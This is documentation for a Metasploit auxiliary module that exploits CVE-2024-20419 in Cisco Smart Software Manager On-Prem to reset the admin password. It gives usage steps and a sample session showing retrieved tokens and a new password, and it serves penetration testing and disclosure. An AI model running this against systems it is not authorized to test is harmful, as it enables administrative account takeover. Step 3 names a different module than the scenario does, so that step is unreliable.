## Vulnerable Application

This module exploits an improper access control vulnerability in Cisco Smart Software Manager (SSM) On-Prem <= 8-202206 (CVE-2024-20419),
by changing the password of the admin user.

The vendor published an advisory [here]
(https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cssm-auth-sLw3uhUy). The original research blog
is available [here](https://www.0xpolar.com/blog/CVE-2024-20419).

## Testing

The software can be obtained from the [vendor](https://software.cisco.com/download/home/286285506/type/286326948/release/9-202407).

Deploy it by following the vendor's [installation guide]
(https://www.cisco.com/web/software/286285517/152313/Smart_Software_Manager_On-Prem_8-202006_Installation_Guide.pdf).

**Successfully tested on**

- Cisco Smart Software Manager (SSM) On-Prem v8-202206.

## Verification Steps

1. Deploy Cisco Smart Software Manager (SSM) On-Prem v8-202206
2. Start `msfconsole`
3. `use auxiliary/admin/http/fortra_filecatalyst_workflow_sqli`
4. `set RHOSTS <IP>`
5. `run`
6. A new password should have been set for the admin account.

## Options

### USER
The user of which the password should be changed (default: admin)
### NEW_PASSWORD
Password to be used when creating a new user with admin privileges.

## Scenarios

Running the module against Smart Software Manager (SSM) On-Prem v8-202206 should result in an output
similar to the following:

```
msf6 > use auxiliary/admin/http/cisco_ssm_onprem_account 
msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > set RHOSTS 192.168.137.200
msf6 auxiliary(admin/http/cisco_ssm_onprem_account) > exploit 
[*] Running module against 192.168.137.200

[+] Server reachable.
[+] Retrieved XSRF Token: RAjYUE7aNosSoXUHQu3S2VWj2h+t5ioGFCV8PwMIkNIkX15f1H10sJJY5V1yTG6tsSkhonOIr2lI3VhseclCRw==
[+] Retrieved _lic_engine_session: 22b193146b9071bbf695182f22bfcb09
[+] Retrieved auth_token: 73e63ab74a07d9d4099d0c9918c21ceaad1c2db94058b32aa6d990178dbe13b5
[+] Password for the admin user was successfully updated: Epd45bZ9OCJIFiEr!
[+] Login at: http://192.168.137.200:8443/#/logIn?redirectURL=%2F
[*] Auxiliary module execution completed
```
